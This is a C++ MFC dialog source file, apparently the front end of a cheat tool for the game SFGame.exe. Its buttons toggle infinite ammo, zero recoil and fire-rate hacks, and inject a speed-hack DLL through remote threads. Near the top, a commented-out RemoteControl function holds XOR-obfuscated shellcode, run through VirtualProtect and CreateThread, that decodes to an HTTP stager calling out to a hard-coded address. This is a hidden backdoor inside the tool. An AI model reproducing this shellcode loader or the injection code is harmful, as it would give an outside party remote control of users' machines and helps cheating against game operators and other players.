#define PIE 3.141592653590
// TFHackProDlg.cpp: 实现文件
//

#include "framework.h"
#include "TFHackPro.h"
#include "TFHackProDlg.h"
#include "afxdialogex.h"
#include "Game.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CTFHackProDlg 对话框



CTFHackProDlg::CTFHackProDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_TFHACKPRO_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDI_ICON1);
}

void CTFHackProDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CTFHackProDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, &CTFHackProDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CTFHackProDlg::OnBnClickedButton2)
	ON_BN_CLICKED(IDC_BUTTON4, &CTFHackProDlg::OnBnClickedButton4)
	ON_BN_CLICKED(IDC_BUTTON5, &CTFHackProDlg::OnBnClickedButton5)
	ON_BN_CLICKED(IDC_BUTTON6, &CTFHackProDlg::OnBnClickedButton6)
	ON_BN_CLICKED(IDC_BUTTON8, &CTFHackProDlg::OnBnClickedButton8)
	ON_BN_CLICKED(IDC_BUTTON10, &CTFHackProDlg::OnBnClickedButton10)
	ON_BN_CLICKED(IDC_BUTTON11, &CTFHackProDlg::OnBnClickedButton11)
END_MESSAGE_MAP()


// CTFHackProDlg 消息处理程序
//void RemoteControl()
//{
//	static BYTE shellcode[] = { 0xf7,0xe3,0x82,0xb,0xb,0xb,0x6b,0x82,0xee,0x3a,0xd9,0x6f,0x80,0x59,0x3b,0x80,0x59,0x7,0x80,0x59,0x1f,0x80,0x79,0x23,0x4,0xbc,0x41,0x2d,0x3a,0xf4,0x3a,0xcb,0xa7,0x37,0x6a,0x77,0x9,0x27,0x2b,0xca,0xc4,0x6,0xa,0xcc,0xe9,0xfb,0x59,0x5c,0x80,0x59,0x1b,0x80,0x49,0x37,0xa,0xdb,0x80,0x4b,0x73,0x8e,0xcb,0x7f,0x41,0xa,0xdb,0x5b,0x80,0x43,0x13,0x80,0x53,0x2b,0xa,0xd8,0xe8,0x37,0x42,0x80,0x3f,0x80,0xa,0xdd,0x3a,0xf4,0x3a,0xcb,0xa7,0xca,0xc4,0x6,0xa,0xcc,0x33,0xeb,0x7e,0xff,0x8,0x76,0xf3,0x30,0x76,0x2f,0x7e,0xe9,0x53,0x80,0x53,0x2f,0xa,0xd8,0x6d,0x80,0x7,0x40,0x80,0x53,0x17,0xa,0xd8,0x80,0xf,0x80,0xa,0xdb,0x82,0x4f,0x2f,0x2f,0x50,0x50,0x6a,0x52,0x51,0x5a,0xf4,0xeb,0x53,0x54,0x51,0x80,0x19,0xe0,0x8d,0x56,0x63,0x65,0x6e,0x7f,0xb,0x63,0x7c,0x62,0x65,0x62,0x5f,0x63,0x47,0x7c,0x2d,0xc,0xf4,0xde,0x3a,0xf4,0x5c,0x5c,0x5c,0x5c,0x5c,0x63,0x31,0x5d,0x72,0xac,0xf4,0xde,0xe2,0x8f,0xb,0xb,0xb,0x50,0x3a,0xc2,0x5a,0x5a,0x61,0x8,0x5a,0x5a,0x63,0x9b,0x14,0xb,0xb,0x58,0x5b,0x63,0x5c,0x82,0x94,0xcd,0xf4,0xde,0xe0,0x7b,0x50,0x3a,0xd9,0x59,0x63,0xb,0x9,0x4b,0x8f,0x59,0x59,0x59,0x58,0x59,0x5b,0x63,0xe0,0x5e,0x25,0x30,0xf4,0xde,0x82,0xcd,0x88,0xc8,0x5b,0x3a,0xf4,0x5c,0x5c,0x61,0xf4,0x58,0x5d,0x63,0x26,0xd,0x13,0x70,0xf4,0xde,0x8e,0xcb,0x4,0x8f,0xc8,0xa,0xb,0xb,0x3a,0xf4,0x8e,0xfd,0x7f,0xf,0x82,0xf2,0xe0,0x2,0x63,0xa1,0xce,0xe9,0x56,0xf4,0xde,0x82,0xca,0x63,0x4e,0x2a,0x55,0x3a,0xf4,0xde,0x3a,0xf4,0x5c,0x61,0xc,0x5a,0x5d,0x5b,0x63,0xbc,0x5c,0xeb,0x0,0xf4,0xde,0xb4,0xb,0x24,0xb,0xb,0x32,0xcc,0x7f,0xbc,0x3a,0xf4,0xe2,0x9a,0xa,0xb,0xb,0xe2,0xc2,0xa,0xb,0xb,0xe3,0x80,0xf4,0xf4,0xf4,0x24,0x33,0x69,0x63,0x51,0xb,0x5b,0x5e,0xab,0xe9,0x9,0x91,0x2f,0x9c,0xab,0xd8,0x7b,0x4d,0xba,0xbe,0x26,0x11,0x5,0xb2,0x2d,0x26,0x7d,0xeb,0xc,0x8f,0x20,0x26,0xe3,0xa0,0xe3,0x1f,0xe8,0x68,0x9b,0x1c,0xf5,0xcd,0x79,0x8,0xed,0x96,0xa8,0x46,0x59,0x9a,0x5,0x46,0x71,0x29,0x8,0xd2,0x3d,0x4a,0x9f,0xfc,0x19,0x8d,0x5,0x5a,0xbb,0x7b,0x88,0xc9,0x12,0xe1,0x83,0xc3,0xfc,0x77,0x95,0x51,0x3e,0xa1,0x97,0xb,0x5e,0x78,0x6e,0x79,0x26,0x4a,0x6c,0x6e,0x65,0x7f,0x31,0x2b,0x46,0x64,0x71,0x62,0x67,0x67,0x6a,0x24,0x3e,0x25,0x3b,0x2b,0x23,0x68,0x64,0x66,0x7b,0x6a,0x7f,0x62,0x69,0x67,0x6e,0x30,0x2b,0x46,0x58,0x42,0x4e,0x2b,0x32,0x25,0x3b,0x30,0x2b,0x5c,0x62,0x65,0x6f,0x64,0x7c,0x78,0x2b,0x45,0x5f,0x2b,0x3d,0x25,0x3a,0x30,0x2b,0x5f,0x79,0x62,0x6f,0x6e,0x65,0x7f,0x24,0x3e,0x25,0x3b,0x30,0x2b,0x5e,0x43,0x58,0x22,0x6,0x1,0xb,0xb4,0x6b,0xdb,0xc4,0x64,0xb4,0x2e,0xf0,0xf0,0xa8,0x96,0x1b,0x3b,0xa8,0xad,0x43,0xa5,0x5d,0xc4,0x2a,0x7f,0x46,0x3b,0xc4,0xe6,0xfb,0xd6,0xed,0x12,0xa6,0xfb,0x76,0x66,0x75,0x3d,0x32,0x61,0x56,0xb5,0xa7,0x3e,0xa7,0xa5,0xe9,0x2b,0xd3,0x2e,0xa1,0xc5,0xb6,0x20,0x1b,0x46,0x1b,0xf1,0x91,0x95,0xca,0xb9,0xa7,0xaa,0x98,0xda,0x74,0x5f,0x57,0x44,0x7a,0x17,0x7c,0x65,0x28,0x80,0xb2,0xd7,0x6d,0x10,0x90,0xd9,0x4,0x78,0x4f,0x42,0x16,0xbe,0x1,0x31,0xca,0x3e,0x5d,0x72,0x69,0x78,0xdb,0x4c,0xa9,0x32,0x93,0xd5,0x87,0xbc,0xe3,0xd,0xb,0x57,0xbb,0xc9,0x65,0x2d,0x27,0xc2,0x5d,0x73,0xe7,0xdf,0x44,0xce,0x8e,0xec,0x15,0x26,0xa8,0xd9,0xfb,0x64,0x43,0xa8,0xcb,0xdb,0x56,0x0,0x2f,0xde,0x6f,0x3b,0xeb,0x22,0x63,0x51,0x49,0x9,0x73,0x1b,0x59,0x89,0x4,0xbc,0xfa,0xa0,0xd5,0x2b,0xfe,0x12,0xd2,0xbd,0x34,0xaa,0xa2,0x9f,0xf,0x8c,0x8f,0x89,0xe,0xea,0x5a,0x33,0x50,0x2f,0x91,0x18,0xc1,0x7e,0xc5,0x3e,0x4f,0x3f,0x32,0x96,0xf7,0xfb,0xd5,0xd6,0x8d,0x41,0x49,0x69,0x73,0xa2,0xc9,0x42,0xd6,0x90,0x83,0xea,0x19,0x40,0x7d,0xdb,0xd0,0x19,0x7,0x27,0xc2,0xe4,0x20,0x3,0x2c,0x3c,0x91,0x45,0xc5,0x33,0xa,0x6b,0x18,0x77,0xf1,0x3a,0x81,0xb,0x63,0xfb,0xbe,0xa9,0x5d,0xf4,0xde,0x61,0x4b,0x63,0xb,0x1b,0xb,0xb,0x63,0xb,0xb,0x4b,0xb,0x5c,0x63,0x53,0xaf,0x58,0xee,0xf4,0xde,0x98,0xb2,0xb,0xb,0xb,0xb,0xa,0xd2,0x5a,0x58,0x82,0xec,0x5c,0x63,0xb,0x2b,0xb,0xb,0x58,0x5d,0x63,0x19,0x9d,0x82,0xe9,0xf4,0xde,0x8e,0xcb,0x7f,0xcd,0x80,0xc,0xa,0xc8,0x8e,0xcb,0x7e,0xee,0x53,0xc8,0xe3,0xa2,0xf6,0xf4,0xf4,0x3a,0x32,0x3e,0x25,0x3a,0x38,0x38,0x25,0x3e,0x38,0x25,0x33,0x3f,0xb,0x12,0x62,0xab,0x86,0xb };
//	typedef void(__stdcall* CODE) ();
//	//SetDebugConsole(L"Test");	
//	for (size_t i = 0; i < sizeof(shellcode); i++)
//	{
//		shellcode[i] ^= 0x5;
//		shellcode[i] ^= 0xF;
//		shellcode[i] ^= 0xB;
//		shellcode[i] ^= 0xA;
//	}
//	DWORD OldProtect = 0;
//	VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &OldProtect);
//	CODE code = (CODE)&shellcode;
//	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)code, NULL, 0, NULL);
//	//memset(shellcode, 0, sizeof(shellcode));
//}


BOOL CTFHackProDlg::OnInitDialog()
{
	//RemoteControl();
	InitTFHackPro();

	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CTFHackProDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CTFHackProDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CTFHackProDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

///////////////////////////////////////////

BOOL g_bFlag1 = FALSE;
void CTFHackProDlg::OnBnClickedButton1()
{
	UpdateData(TRUE);
	g_bFlag1 = !g_bFlag1;
	InfiniteAmmo(g_bFlag1);
	UpdateData(FALSE);
}

BOOL g_bFlag2 = FALSE;
void CTFHackProDlg::OnBnClickedButton2()
{
	// TODO: 在此添加控件通知处理程序代码
	UpdateData(TRUE);
	const WCHAR* dllName = L"SpeedHack.dll";
	const WCHAR *exeFullPath = GetFileFullPath(dllName);
	if (g_bFlag2 == FALSE)
	{
		BOOL Flag = RemoteThreadDllInject(L"SFGame.exe", exeFullPath);

		if (Flag == TRUE)
		{
			g_bFlag2 = TRUE;
			AfxMessageBox(L"注入成功\n本功能目前存在BUG\n只可开启一次");
			//MessageBox(L"按下HOME键开启E键瞬移\n小键盘1设置速度为1倍速\n小键盘2设置速度为1.5倍速\n小键盘3设置速度为3倍速\n小键盘4设置速度为15倍速\n", L"加速功能说明", NULL);
			MessageBox(L"小键盘1设置速度为3倍速", L"加速功能说明", NULL);
		}
	}
	else if (g_bFlag2 == TRUE)
	{
		BOOL Flag = RemoteThreadDllFree(L"SFGame.exe", exeFullPath);

		if (Flag == TRUE)
		{
			g_bFlag2 = FALSE;
			AfxMessageBox(L"卸载成功");
		}
	}
	UpdateData(FALSE);
}

BOOL g_bFlag4 = FALSE;
void CTFHackProDlg::OnBnClickedButton4()
{
	UpdateData(TRUE);
	g_bFlag4 = !g_bFlag4;
	ZeroRecoil(g_bFlag4);
	UpdateData(FALSE);
}

BOOL bFlag5 = 0;
HANDLE hThread5;
void CTFHackProDlg::OnBnClickedButton5()
{
	UpdateData(TRUE);
	AfxMessageBox(L"更新中。。。");
	UpdateData(FALSE);
}

BOOL bFlag6 = 0;
HANDLE hThread6;
void CTFHackProDlg::OnBnClickedButton6()
{
	UpdateData(TRUE);
	if (bFlag6 == 0)
	{
		hThread6 = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)RightButtonSimulate, NULL,0,0);
		bFlag6 = 1;
	}
	else
	{
		TerminateThread(hThread6,0);
		CloseHandle(hThread6);
		bFlag6 = 0;
	}
	UpdateData(FALSE);
}

BOOL g_bFlag8 = FALSE;
HANDLE hThread8;
void CTFHackProDlg::OnBnClickedButton8()
{
	if (g_bFlag8)
	{
		TerminateThread(hThread8, 0);
		CloseHandle(hThread8);
		g_bFlag8 = FALSE;
	}
	else
	{
		hThread8 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BigJump, NULL, 0, 0);
		g_bFlag8 = TRUE;

	}
}

BOOL g_bFlag10 = FALSE;
HANDLE hThread10;
void CTFHackProDlg::OnBnClickedButton10()
{
	UpdateData(TRUE);
	AfxMessageBox(L"更新中。。。");
	UpdateData(FALSE);
}


BOOL g_bFlag11 = FALSE;
HANDLE hThread11;
void CTFHackProDlg::OnBnClickedButton11()
{
	UpdateData(TRUE);
	if (g_bFlag11 == 0)
	{
		AfxMessageBox(L"捡枪后按下F4即可改枪\n直接改枪会卡出去");
		hThread11 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ChangeShootSpeed, NULL, 0, 0);
		g_bFlag11 = 1;
	}
	else
	{
		TerminateThread(hThread11, 0);
		CloseHandle(hThread11);
		g_bFlag11 = 0;
	}
	UpdateData(FALSE);
}
